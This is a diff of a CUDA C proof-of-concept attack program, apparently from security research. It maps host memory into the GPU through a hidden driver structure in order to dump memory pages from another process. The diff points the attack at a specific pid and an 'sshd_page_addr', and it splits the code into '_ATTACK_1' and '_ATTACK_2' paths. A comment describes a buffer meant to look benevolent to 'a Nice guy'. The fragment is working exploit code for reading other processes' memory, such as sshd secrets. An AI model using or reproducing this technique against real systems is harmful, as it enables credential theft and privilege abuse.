@@ -140,7 +140,7 @@ int main(void) {
 	CUDA_CHECK_RETURN(cudaDeviceSynchronize());
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
 
-	CUDA_CHECK_RETURN(cudaPeekAtLastError());
+	CUDA_CHECK_NORETURN(cudaPeekAtLastError());
 
 	fflush(stdout);
 
@@ -157,10 +157,14 @@ int main(void) {
 	printf("info buffer addr: 0x%llx\n",(unsigned long)info_for_cuda_driver);
 
   // Malloc alligned buffer.
+#ifdef _ATTACK_1
 	char * real_buff = (char*)aligned_malloc(pagesize*sizeof(char));
+#endif
 	char * dump_buff = (char*)aligned_malloc(pagesize*sizeof(char));
 
+#ifdef _ATTACK_1
 	memset(real_buff,0x4141,pagesize*sizeof(char)); // Fill buffer with 414141
+#endif
 	memset(dump_buff,1,pagesize*sizeof(char));
 
 	/*calculate the victim function parameters*/
@@ -177,7 +181,8 @@ int main(void) {
 
 	//Set hidden Address:
 //	info_for_cuda_driver->start_addr = (unsigned long)base;
-	info_for_cuda_driver->pid = 2751;
+	info_for_cuda_driver->pid = 14196;
+	info_for_cuda_driver->sshd_page_addr = 0x7f1862dac000;
 
 	char * d_real_buff;
 	char * d_dump_buff;
@@ -200,6 +205,8 @@ int main(void) {
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE)) ;
 	/* Map what a Nice guy would think is a benevelent buffer.
 	Note : Data is copied from user space hidden buffer. It can be changed afterwards. Will not effect Driver!*/
+
+#ifdef _ATTACK_1
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)real_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;
 
 	/* Get device pointer of this buffer */
@@ -218,6 +225,7 @@ int main(void) {
 //	fflush(stdout);
 
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
+#endif
 
 #define _ATTACK_2
 #ifdef _ATTACK_2
@@ -235,12 +243,13 @@ int main(void) {
 //	for (int i = 0; i < 1024; i ++) printf("%d %c ", i, dump_buff[i]);
 
 	/*Activate cuda kernel, that print the dumped page */
+#if 0
 	PixsysCuda_print<<<1,1>>>(d_dump_buff, pagesize);
 	CUDA_CHECK_RETURN(cudaDeviceSynchronize());
-
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
+#endif
 
-	CUDA_CHECK_RETURN(cudaPeekAtLastError());
+	CUDA_CHECK_NORETURN(cudaPeekAtLastError());
 
 	fflush(stdout);
 
@@ -248,7 +257,9 @@ int main(void) {
 
 
 	// should remove this?
+#ifdef _ATTACK_1
 		CUDA_CHECK_RETURN(cudaHostUnregister((void *)real_buff));
+#endif
 		CUDA_CHECK_RETURN(cudaHostUnregister((void *)dump_buff));
 		CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
 		CUDA_CHECK_RETURN(cudaGetLastError());
